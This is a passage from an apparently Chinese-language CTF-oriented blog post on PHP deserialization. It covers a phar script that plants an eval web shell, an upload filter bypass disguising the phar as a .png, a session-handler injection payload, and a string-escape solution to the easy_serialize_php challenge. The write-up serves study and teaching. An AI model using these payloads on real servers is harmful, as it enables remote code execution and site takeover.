<p>那我们就联想到了，上传phar文件，phar协议输出，进行反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>(); <span class="hljs-comment">//创建一个flag的对象</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;A.phar&#x27;</span>); <span class="hljs-comment">//创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。</span><br><span class="hljs-comment">//功能：new Phar(&quot;phar.phar&quot;)  文件名后缀必须是phar</span><br><span class="hljs-comment">//参数：&quot;phar.phar&quot; 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <span class="hljs-comment">//开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。&quot;test.txt&quot; 是文件名，&quot;test&quot; 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 &quot;test&quot;。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。</span><br><span class="hljs-comment">//自动计算签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>对__HALT_COMPILER()有过滤，所以通过gzip命令绕过，因为只能上传图片，所以修改后缀为.png</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161036193.png"></p>
<p>上传aa.png</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161039957.png"></p>
<p>在class.php下phar读取，进行反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">file=phar:<span class="hljs-comment">///var/www/html/upload/321532365639f31b3b9f8ea8be0c6be2.png </span><br></code></pre></td></tr></table></figure>

<p>访问&#x2F;1.php，GET传参执行命令</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161043057.png" alt="img"></p>
<h2 id="SESSION的概念"><a href="#SESSION的概念" class="headerlink" title="SESSION的概念"></a>SESSION的概念</h2><p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。因为HTTP协议是无状态的，那如何辨别“你是你”呢，那就用到了session，通过cookie中的session来进行用户追踪。</p>
<h2 id="SESSION的工作原理"><a href="#SESSION的工作原理" class="headerlink" title="SESSION的工作原理"></a>SESSION的工作原理</h2><p>当我们开启一个session会话时，首先php会先查找session_id，如果在请求的cookie中，服务器没有在GET或者POST请求方式中找到session_id，那么这个时候php就会调用php_session_create_id函数来创建一个新的会话，在http-response中通过set-cookie头部发送给客户端，session在客户端保存。</p>
<p><strong>session_start()函数</strong></p>
<p>上面说了session的创建，那么下面我们就要说一下session的创建过程，我们先来看一下session_statrt()这个函数，这个函数的作用是开启会话，初始化session数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Seesion_start</span>()函数会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时<span class="hljs-title function_ invoke__">Session_start</span>()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的<br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161517719.png" alt="img"></p>
<h2 id="SESSION的存储机制"><a href="#SESSION的存储机制" class="headerlink" title="SESSION的存储机制"></a>SESSION的存储机制</h2><p>写一个测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;session_id(): &quot;</span>.<span class="hljs-title function_ invoke__">session_id</span>().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;COOKIE: &quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;PHPSESSID&quot;</span>];<br><br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161531721.png" alt="img"></p>
<p>可以看到生成了一个session</p>
<p>我们查看一下文件夹，一般都在是存储在tmp&#x2F;里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/var/lib/php5/sess_PHPSESSID<br>/var/lib/php7/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSED<br>liunx常见保存位置<br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161533665.png" alt="img"></p>
<p>最后一个就是我们刚创建的session了</p>
<p>我们给session赋值看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test2&#x27;</span>]=<span class="hljs-string">&#x27;world&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;\n&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;session_id(): &quot;</span> . <span class="hljs-title function_ invoke__">session_id</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;COOKIE: &quot;</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;PHPSESSID&quot;</span>];<br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161544088.png" alt="img"></p>
<p>可以看到数据是以序列化的状态存储在文件中的</p>
<p>那就是HTTP请求一个页面后，如果用到开启session，会去读COOKIE中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入COOKIE中的PHPSESSID中，再生成一个sess_前缀文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。当读取到session变量的时候，先会读取COOKIE中的PHPSESSID，获得session_id，然后再去找这个sess_session_id文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成session_id和sess_session_id这个文件。</p>
<h2 id="SESSION模块的参数含义"><a href="#SESSION模块的参数含义" class="headerlink" title="SESSION模块的参数含义"></a>SESSION模块的参数含义</h2><table>
<thead>
<tr>
<th align="center"><strong>Directive</strong></th>
<th align="center"><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">session.save_handler</td>
<td align="center">session保存形式。默认为files</td>
</tr>
<tr>
<td align="center">session.save_path</td>
<td align="center">session保存路径。</td>
</tr>
<tr>
<td align="center">session.serialize_handler</td>
<td align="center">session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td align="center">session.upload_progress.cleanup</td>
<td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td align="center">session.upload_progress.enabled</td>
<td align="center">将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody></table>
<p>主要有三种处理器</p>
<p>当 <strong>session.serialize_handler&#x3D;php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
<p>当 <strong>session.serialize_handler&#x3D;php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p>
<p>当 <strong>session.serialize_handler&#x3D;php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p>
<p>可以用ini_set来改变处理器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>当 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<a target="_blank" rel="noopener" href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a target="_blank" rel="noopener" href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a target="_blank" rel="noopener" href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a target="_blank" rel="noopener" href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p>
<h2 id="SESSION的反序列化"><a href="#SESSION的反序列化" class="headerlink" title="SESSION的反序列化"></a>SESSION的反序列化</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161556577.png" alt="img"></p>
<p>这也就是SESSION反序列化的切入点了，我们可以直接通过写入SESSION文件，然后请求页面，让php自行将我们的序列化字符串进行反序列化，但是因为我们传入的是键值对，那么<code>session</code>序列化存储所用的处理器肯定也是将这个键值对写了进去，怎么才能让它正好反序列化到我们传入的内容。</p>
<p>这里就要用到我们上面介绍到的不同序列化处理器的特性，我们可以在我们传入的序列化内容前面加一个|,在php_serialize处理后会返回一个序列化后的数组，但是在使用php处理器会以竖线|作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行反序列化操作，这样就能够实现我们session反序列化操作。</p>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>?test=|O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h3 id="小试牛刀—-安洵杯-2019-easy-serialize-php（session反序列化-减逃逸）"><a href="#小试牛刀—-安洵杯-2019-easy-serialize-php（session反序列化-减逃逸）" class="headerlink" title="小试牛刀—-[安洵杯 2019]easy_serialize_php（session反序列化+减逃逸）"></a>小试牛刀—-[安洵杯 2019]easy_serialize_php（session反序列化+减逃逸）</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125; <br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161622229.png" alt="img"></p>
<p>传入phpinfo看一下</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161724600.png"></p>
<p>可以看到，反序列化处理器是php，文件提示，d0g3_f1ag.php</p>
<p>那么看代码可以知道，我们的目的是执行<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>这个函数，并且一看就知道还是字符串减少的字符串逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">看代码，需要满足f=show_image,让字符串逃逸<br>原始字符串为<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>序列化一下看看<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;show_image&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>);<br>a:<span class="hljs-number">3</span>：&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guest&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;<br>现在要把img给弄成ZDBnM19mMWFnLnBocA==（d0g3_flag.php的base64编码）<br>从user下手，把guest<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span>&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image给吞掉，然后自己再造个键值对</span><br><span class="hljs-string">即</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string"><span class="hljs-subst">$_SESSION</span>[&quot;</span>user<span class="hljs-string">&quot;] = &#x27;flagflagflagflagflagflag&#x27;;</span><br><span class="hljs-string"><span class="hljs-subst">$_SESSION</span>[&#x27;function&#x27;] = &#x27;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;dd&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$_SESSION[&#x27;</span>dd<span class="hljs-string">&#x27;] = base64_encode(&#x27;</span>d0g3_f1ag.php<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">echo serialize($_SESSION);</span><br><span class="hljs-string">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:79:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>



<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0Dg7=YqBK0QD/iW4nrBeIe0K=Qx">带你走进PHP session反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/16859098.html">session反序列化</a></p>
<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%B8%80">PHP反序列化入门之phar</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/16786627.html">PHP Phar反序列化学习</a></p>
<p><a target="_blank" rel="noopener" href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化总结</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9213?time__1311=n4+xnD0DuAG=oxGqGNnmDUxYqxEkDcAA2xmupD">PHP反序列化 — 字符逃逸</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9895?time__1311=n4+xnD0DuDRD9B7NDsAoxCqw0r7ei=37tH4D">通过CTF题目学习反序列化字符串逃逸</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2226541">干货 | 能看懂的PHP反序列化字符逃逸漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化入门之session反序列化</a></p>

    </div>

    <!-- 返回主页链接 -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js"></script>
<script>Prism.highlightAll();</script>


<footer class="bg-black text-gray-400 py-4">
    <div class="container mx-auto text-center">
      <p>© <span id="current-year"></span>  Zer0 
        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
    </div>
  </footer>
  
  <script> 
    document.getElementById("current-year").textContent = new Date().getFullYear();
  </script>
  


</body>
</html>
